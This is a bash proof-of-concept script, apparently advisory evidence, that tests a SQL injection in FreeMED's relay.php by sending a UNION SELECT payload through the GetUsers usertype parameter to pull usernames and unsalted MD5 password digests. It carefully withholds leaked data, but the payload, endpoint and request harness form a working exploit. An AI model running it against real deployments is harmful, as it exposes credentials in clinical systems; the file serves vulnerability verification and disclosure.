#!/usr/bin/env bash
#
# repro-relay-sqli.sh - hostile repro for SQL injection through relay.php's JSON transport
#
# relay.php only checks that a user is logged in; the API method below
# concatenates user input straight into SQL:
#
#   lib/org/freemedsoftware/api/UserInterface.class.php:144
#     $condition = $condition." AND usertype='".$usertype."' ";
#
# The injected payload does not try to change the query shape - it appends a
# UNION SELECT that hands back user.username / user.userpassword (an unsalted
# MD5 digest), which the response must never be able to contain.
#
# THE VECTOR (measured, not assumed)
#
# The method goes in PATH_INFO and the parameters are form fields named
# param0..paramN (Relay::extract_parameters() -> `param1 ... paramN` branch):
#
#   POST /relay.php/json/org.freemedsoftware.api.UserInterface.GetUsers
#   Content-Type: application/x-www-form-urlencoded
#   param0=a&param1=x' UNION SELECT username,userpassword FROM user-- -
#
# The JSON-body form (`{"method":...,"params":[...]}`) is NOT usable: it fatals
# on Relay_Json::deserialize_parameters(), which is called at
# Relay_Json.class.php:87 and defined nowhere in the tree, so no injection ever
# runs. Login over relay JSON is fatal for the same reason; obtain a session
# from the deployment's own UI (or, on the verify stack, login-probe.php) and
# hand it to this script.
#
# Usage:
#   RELAY_COOKIE_JAR=/tmp/fm.jar BASE=http://localhost:38081 ./repro-relay-sqli.sh
#
# Environment:
#   BASE                       base URL (default http://localhost:38081)
#   RELAY_COOKIE_JAR           curl cookie jar holding an authenticated session
#   RELAY_SESSION_COOKIE       session cookie VALUE, if you have no jar file
#   RELAY_SESSION_COOKIE_NAME  cookie name for the value above (default SessionID)
#   TIMEOUT                    per-request curl timeout in seconds (default 20)
#
# One of RELAY_COOKIE_JAR / RELAY_SESSION_COOKIE is REQUIRED. This script never
# logs in by itself and contains no credential: it measures the injection, it
# does not establish identity. If neither is supplied it exits 2 with
# instructions instead of reporting a meaningless clean result.
#
# On the FreeMED verify stack (verify-env.md section 5) a session is obtained
# with the stack's own probe:
#   curl -s -c /tmp/fm.jar http://localhost:38081/login-probe.php
#   RELAY_COOKIE_JAR=/tmp/fm.jar BASE=http://localhost:38081 ./repro-relay-sqli.sh
# Any deployment's UI session works the same way - that file is an example, not
# a dependency, and is never used unless you point RELAY_COOKIE_JAR at it.
#
# The cookie value is never passed on a command line (a jar file path is; the
# cookie value is not) and never printed; the request body - including the
# injected payload - is piped to curl on stdin (`--data-binary @-`) so it is not
# visible in ps(1) or /proc/<pid>/cmdline on a shared clinical host.
#
# Exit codes:
#   0  the session was authenticated, every payload was answered, and nothing leaked
#   1  EXPLOITED - a digest, an unexpected row, or MySQL error text came back
#   2  inconclusive - no session supplied, session not authenticated, PHP fatal or
#      5xx, or a request got no response (deliberately distinct from 1)
#
# Only `set -u` is used: every request must be attempted even when an earlier
# curl fails.
set -u

BASE="${BASE:-http://localhost:38081}"
TIMEOUT="${TIMEOUT:-20}"
RELAY_COOKIE_JAR="${RELAY_COOKIE_JAR:-}"
RELAY_SESSION_COOKIE="${RELAY_SESSION_COOKIE:-}"
RELAY_SESSION_COOKIE_NAME="${RELAY_SESSION_COOKIE_NAME:-SessionID}"
TMPDIR="${TMPDIR:-/tmp}"

# The injection. param1 is `$usertype`, concatenated raw into the WHERE clause.
INJ="x' UNION SELECT username,userpassword FROM user-- -"

# Response markers.
# A 32-hex digest is the userpassword column. The old unanchored
# `[0-9a-f]{32}` matched ANY 32-hex string anywhere in ANY response, which is a
# false accusation in an advisory's evidence file; a digest now only counts when
# it is a JSON string adjacent to another JSON string (the
# ["<username>","<md5>"] row shape this payload produces), or when there are two
# or more bare 32-hex strings in one response.
MD5_JSON_RE='"[^"[:space:]]{1,64}"[[:space:]]*,[[:space:]]*"[0-9a-f]{32}"'
MD5_BARE_RE='[0-9a-f]{32}'
SQLERR_RE='SQL syntax|check the manual that corresponds|mysql_(query|fetch|connect)|Warning: mysqli?|You have an error'
FATAL_RE='Fatal error|Uncaught |Parse error'
SESSION_BAD_RE='INVALID_SESSION'

# Cookie jar. RELAY_COOKIE_JAR is used exactly as given and never rewritten
# (-b only, no -c). A cookie VALUE supplied in the environment is materialised
# into a 0600 temp jar under TMPDIR so it stays out of argv.
JAR=""
JAR_OWNS=0
if [ -n "$RELAY_COOKIE_JAR" ]; then
  if [ ! -r "$RELAY_COOKIE_JAR" ]; then
    printf 'repro: RELAY_COOKIE_JAR=%s is not readable\n' "$RELAY_COOKIE_JAR" >&2
    exit 2
  fi
  JAR="$RELAY_COOKIE_JAR"
elif [ -n "$RELAY_SESSION_COOKIE" ]; then
  if ! JAR="$(mktemp "${TMPDIR%/}/freemed-relay-cookies.XXXXXX")"; then
    printf 'repro: mktemp failed in %s - refusing to fall back to a predictable path\n' "${TMPDIR%/}" >&2
    exit 2
  fi
  JAR_OWNS=1
  hostport="${BASE#*://}"
  hostport="${hostport%%/*}"
  host="${hostport##*@}"
  host="${host%%:*}"
  ( umask 077; printf '%s\tFALSE\t/\tFALSE\t0\t%s\t%s\n' \
      "$host" "$RELAY_SESSION_COOKIE_NAME" "$RELAY_SESSION_COOKIE" >"$JAR" )
else
  cat >&2 <<EOF
repro: INCONCLUSIVE - no relay session supplied, so nothing can be measured.

This script fires an authenticated injection; it does not authenticate. Supply
an authenticated session for the deployment under test in ONE of:

  RELAY_COOKIE_JAR=<path>        a curl cookie jar holding the session cookie
  RELAY_SESSION_COOKIE=<value>   the session cookie value itself
                                 (name via RELAY_SESSION_COOKIE_NAME, default SessionID)

Example - the FreeMED verify stack provides its own login probe (verify-env.md
section 5). Relay JSON login is fatal on PHP 8.3, so use it:

  curl -s -c /tmp/fm.jar http://localhost:38081/login-probe.php
  RELAY_COOKIE_JAR=/tmp/fm.jar BASE=http://localhost:38081 $(basename "$0")

For any other deployment, take the session cookie out of your browser's UI
session (DevTools -> Application -> Cookies) or out of your own login probe.
EOF
  exit 2
fi

if ! OUT="$(mktemp "${TMPDIR%/}/freemed-relay-body.XXXXXX")"; then
  printf 'repro: mktemp failed in %s - refusing to fall back to a predictable path\n' "${TMPDIR%/}" >&2
  exit 2
fi

cleanup() {
  [ -n "${OUT:-}" ] && rm -f "$OUT"
  [ "$JAR_OWNS" = "1" ] && [ -n "$JAR" ] && rm -f "$JAR"
  return 0
}
on_signal() {
  printf '\nrepro: interrupted\n' >&2
  cleanup
  exit 130
}
trap cleanup EXIT
trap on_signal INT TERM HUP

# URL-encode a value for an application/x-www-form-urlencoded body (byte-wise,
# so multibyte input is safe; space becomes %20, which PHP decodes as space).
urlencode() {
  local s="$1" out="" i c hex
  local LC_ALL=C
  for (( i=0; i<${#s}; i++ )); do
    c="${s:i:1}"
    case "$c" in
      [a-zA-Z0-9.~_-]) out="$out$c" ;;
      *)
        printf -v hex '%%%02X' "'$c"
        out="$out$hex"
        ;;
    esac
  done
  printf '%s' "$out"
}

E_EXPLOIT=0
E_INCONCLUSIVE=0
PROBES=0

# fire <label> <method> <raw-fields-for-evidence> <encoded-body>
fire() {
  local label="$1" method="$2" desc="$3" body="$4"
  local url code nbytes n
  url="$BASE/relay.php/json/$method"
  : >"$OUT"
  PROBES=$((PROBES + 1))

  # The body (which carries the injected payload) goes in on stdin: never argv.
  code="$(printf '%s' "$body" | curl -s --max-time "$TIMEOUT" -o "$OUT" \
    -b "$JAR" -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-binary @- -w '%{http_code}' "$url" 2>/dev/null)"
  code="${code:-000}"

  printf -- '--- %s\n' "$label"
  printf '    POST %s\n' "$url"
  printf '    fields as sent (URL-encoded on the wire):\n'
  printf '      %s\n' "$desc"
  printf '    request body as sent: %s\n' "$body"

  if [ "$code" = "000" ]; then
    E_INCONCLUSIVE=$((E_INCONCLUSIVE + 1))
    printf '    HTTP 000  UNREACHABLE: no response (connection refused / timed out)\n\n'
    return 0
  fi

  nbytes="$(wc -c <"$OUT" | tr -d ' ')"
  printf '    HTTP %s  bytes=%s\n' "$code" "$nbytes"

  if grep -qE "$FATAL_RE" "$OUT"; then
    E_INCONCLUSIVE=$((E_INCONCLUSIVE + 1))
    printf '    >>> INCONCLUSIVE: PHP fatal in the response - the request never reached the query\n'
    printf '    body(%s bytes, first line): %s\n\n' "$nbytes" "$(head -n 1 "$OUT" | head -c 160 | tr '\n\r' '  ')"
    return 0
  fi
  if grep -qE "$SESSION_BAD_RE" "$OUT"; then
    E_INCONCLUSIVE=$((E_INCONCLUSIVE + 1))
    printf '    >>> INCONCLUSIVE: relay answered %s - the session is not authenticated,\n' "$SESSION_BAD_RE"
    printf '    so a clean result here would be meaningless (this is NOT "unreachable").\n\n'
    return 0
  fi
  case "$code" in
    5*)
      E_INCONCLUSIVE=$((E_INCONCLUSIVE + 1))
      printf '    >>> INCONCLUSIVE: server error (HTTP %s); nothing was measured\n\n' "$code"
      return 0
      ;;
  esac

  local matched=0 reasons=""
  if grep -qE "$MD5_JSON_RE" "$OUT"; then
    matched=1
    reasons="${reasons:+$reasons; }32-hex MD5 digest in JSON string context next to a username"
  else
    n="$(grep -oE "$MD5_BARE_RE" "$OUT" 2>/dev/null | wc -l | tr -d ' ')"
    if [ "$n" -ge 2 ]; then
      matched=1
      reasons="${reasons:+$reasons; }$n bare 32-hex strings in one response"
    elif [ "$n" -eq 1 ]; then
      printf '    note: 1 bare 32-hex string with no JSON username context - below the\n'
      printf '          two-match threshold, so NOT treated as a leak (avoids a false accusation)\n'
    fi
  fi
  if grep -qE "$SQLERR_RE" "$OUT"; then
    matched=1
    reasons="${reasons:+$reasons; }MySQL error text returned to the client"
  fi

  if [ "$matched" -eq 1 ]; then
    E_EXPLOIT=$((E_EXPLOIT + 1))
    printf '    >>> EXPLOITED: %s\n' "$reasons"
    printf '    body(%s bytes): WITHHELD - a leak marker matched, so no response bytes are printed\n' "$nbytes"
    printf '    (the userpassword digests and any row data are deliberately not written here)\n\n'
    return 0
  fi

  if [ "$nbytes" -gt 0 ]; then
    printf '    body(no leak marker matched, excerpt as received): %s\n' \
      "$(head -c 200 "$OUT" | tr '\n\r' '  ')"
  else
    printf '    body: <empty>\n'
  fi
  printf '    no leak marker in this response\n\n'
  return 0
}

printf 'repro: relay.php JSON-transport SQL injection (param0..paramN form fields, method in PATH_INFO)\n'
printf 'base=%s  session=%s  timeout=%ss\n' "$BASE" \
  "$([ -n "$RELAY_COOKIE_JAR" ] && printf 'cookie jar %s (cookie value never printed)' "$RELAY_COOKIE_JAR" || printf 'RELAY_SESSION_COOKIE value (never printed; jar in TMPDIR)')" \
  "$TIMEOUT"
printf 'note: a response body is printed only when no leak marker matched it; a matched\n'
printf '      body is reported by size and marker name, bytes withheld.\n\n'

# ---------------------------------------------------------------------------
# 1. Session preflight. LoggedIn is in the public namespace, so it answers with
#    or without a session ('true' / 'false'); it never runs an injection.
# ---------------------------------------------------------------------------
printf '== session preflight ==\n'
fire "org.freemedsoftware.public.Login.LoggedIn (session assertion)" \
  "org.freemedsoftware.public.Login.LoggedIn" \
  "(no parameters)" ""
if [ "$(tr -d '[:space:]' <"$OUT")" != "true" ]; then
  printf '>>> RESULT: INCONCLUSIVE - Login.LoggedIn() did not answer "true" (no answer, "false",\n'
  printf '    or an error), so the supplied session is not authenticated and a clean injection\n'
  printf '    result below would be meaningless. Obtain a fresh session (see the header) and re-run.\n'
  exit 2
fi

# ---------------------------------------------------------------------------
# 2. Benign control: the same call with a literal that must select nothing.
# ---------------------------------------------------------------------------
printf '== control: literal, must return null ==\n'
fire "org.freemedsoftware.api.UserInterface.GetUsers (benign control)" \
  "org.freemedsoftware.api.UserInterface.GetUsers" \
  "param0='a'  param1='x'" \
  "param0=$(urlencode 'a')&param1=$(urlencode 'x')"

# ---------------------------------------------------------------------------
# 3. The injection.
# ---------------------------------------------------------------------------
printf '== injection ==\n'
fire "org.freemedsoftware.api.UserInterface.GetUsers (param1 = \$usertype, concatenated raw)" \
  "org.freemedsoftware.api.UserInterface.GetUsers" \
  "param0='a'  param1=\"$INJ\"" \
  "param0=$(urlencode 'a')&param1=$(urlencode "$INJ")"

printf '%s request(s) sent, %s vulnerable response(s), %s inconclusive\n' \
  "$PROBES" "$E_EXPLOIT" "$E_INCONCLUSIVE"

if [ "$E_EXPLOIT" -gt 0 ]; then
  printf '>>> RESULT: EXPLOITED - %s relay response(s) leaked a digest, row data or error text\n' "$E_EXPLOIT"
  exit 1
fi
if [ "$E_INCONCLUSIVE" -gt 0 ]; then
  printf '>>> RESULT: INCONCLUSIVE - %s request(s) produced no usable evidence, so nothing was proven\n' "$E_INCONCLUSIVE"
  exit 2
fi
printf '>>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0)\n'
printf '    The session was authenticated, the control returned no rows, and the injected\n'
printf '    param1=%s\n' "$INJ"
printf '    returned no digest, no unexpected row and no MySQL error text.\n'
exit 0
